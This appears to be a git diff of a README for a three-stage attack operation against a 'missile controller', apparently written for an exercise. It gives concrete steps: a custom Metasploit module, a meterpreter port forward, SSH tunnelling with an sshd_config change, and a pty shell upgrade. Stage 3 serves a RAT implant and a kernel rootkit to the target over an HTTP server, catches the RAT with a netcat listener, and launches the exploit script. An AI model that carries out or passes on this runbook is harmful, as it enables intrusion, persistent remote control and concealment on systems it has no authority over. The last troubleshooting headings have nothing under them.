@@ -14,14 +14,14 @@ All can be customized in stage1.rc file
 - thrower SSH 127.0.0.1:22
 - relay SSH 172.31.82.221:22
 ### How to Run:
-- chmod +x orangeland.py
+- run "chmod +x orangeland.py"
 - move orangeland.py into metasploit-framework/embedded/framework/modules/exploits/unix/webapp/
-- msfconsole -r exploit.rc -- may need to be run with sudo
+- run "msfconsole -r exploit.rc" -- this may need to be run with sudo depending on computer configs
 ### Possible Failures and Solutions:
 Orangeland.py has been tested on multiple ops and should work, if it doesn’t, then verbally harass the analysts.  
-Portfwd add is the only new command, if this fails:
+If portfwd fails:
 - verify that the SSH server is running at the IP and port as indicated, if they are different, re run the portfwd command with -p <SSH_PORT> -r <SSH_IP>
-- run shell in meterpreter, upgrade using python3 -c 'import pty; pty.spawn("/bin/bash")', and verify that the SSH credentials work
+- run "shell" in meterpreter, upgrade using "python3 -c 'import pty; pty.spawn("/bin/bash")'", and verify that the SSH credentials work
 - run the portfwd command with a different thrower port using -l <THROW_PORT> Note, this means that all future SSH commands cannot use sshpass and must use -p <THROW_PORT>  
 ## Stage 2: Setting up Network Communication
 ### Objective
@@ -36,26 +36,45 @@ Can be customized by editing stage2.sh
 - first relay SSH -> thrower port forward (from controller) 172.100.0.1:4242 -> 127.0.0.1:4201
 - second relay SSH -> thrower port forward (from controller) 172.100.0.1:4243 -> 127.0.0.1:4202
 ### How to Run:
-- run and verify stage 1
-- ./stage2.sh
-- verify success by opening http://localhost:4200 in web browser, it should return "Forbidden"
+- execute and verify stage 1
+- run "./stage2.sh"
+- verify success by opening http://localhost:4200 in a web browser, this should return a "Forbidden" page
 ### Possible Failures and Solutions:
-For some reason, we cannot SSH from localhost. If this happens:
+If you cannot SSH into localhost:
 - run shell in meterpreter
 - upgrade using python3 -c 'import pty; pty.spawn("/bin/bash")'
 - SSH into the server with ssh -Nf missileadmin@172.31.81.221
 - run SSH reconfiguration commands and verify success
 - execute port forwarding commands, using 10.0.1.1 instead of 127.0.0.1
   
-An error occurs in the reconfiguration of the SSH server. If this happens:
+If an error occurs in the reconfiguration of the SSH server:
 - SSH into the server from localhost
 - Check if /etc/ssh/sshd_config has 'GatewayPorts yes' in its last line, if not then sudo su and add it
 - Restart ssh service, this can be done with "service ssh restart" or "systemctl restart ssh"
 - Continue with normal port forwarding commands
 
-The commands execute normally, but no response is received from http://localhost:4200
+If the commands execute normally, but no response is received from http://localhost:4200
 - SSH into the server from localhost
 - Run "netstat -plant", check if the output contains a TCP listener on 0.0.0.0:4242
 - If the netstat does contain the TCP listener, it indicates that the mastersockets works. Verify that the controller is up and has the correct IP address with the analysts. Then attempt to rerun the first mastersockets command.
 - If the netstat has the TCP listener on 127.0.0.1 instead of 0.0.0.0, then the server is not configured properly. Go through the confiugration remediation steps.
-- If the netstat has no TCP listener on port 4242, or netstat -plant on the thrower has no open TCP listener on 0.0.0.0:4200, then it is a problem with SSH port forwarding. SSH into the server and determine the issue.
+- If the netstat has no TCP listener on port 4242, or netstat -plant on the thrower has no open TCP listener on 0.0.0.0:4200, then it is a problem with SSH port forwarding. SSH into the server and determine the issue.  
+## Stage 3: Exploiting the Missile Controller
+### Files
+- orangeRodent
+- stage3.py
+- dolos_rootkit.ko
+### IPs and Ports
+Can be edited through changing orangeRodent.c and re-cross-compiling and by editing stage3.py
+- thorwer -> controller port forward 127.0.0.1:4200 -> 172.31.86.120:8080
+- first relay SSH -> thrower port forward (from controller) 172.100.0.1:4242 -> 127.0.0.1:4201
+- second relay SSH -> thrower port forward (from controller) 172.100.0.1:4243 -> 127.0.0.1:4202
+### How to Run
+- execute and verify stages 1 and 2
+- run "python3 -m http.server 4201" in a directory with the orangeRodent and dolos_rootkit.ko to serve the controller the implant 
+- run "nc -lv 4202" in a separate terminal to listen for the rat
+- run "python3 stage3.py" to throw the exploit
+### Possible Failures and Solutions:
+If there is no request made to wget:
+If there is a request to wget, but the netcat listener never catches the rat:
+If the netcat listener receives the rat, but the rootkit is not up:
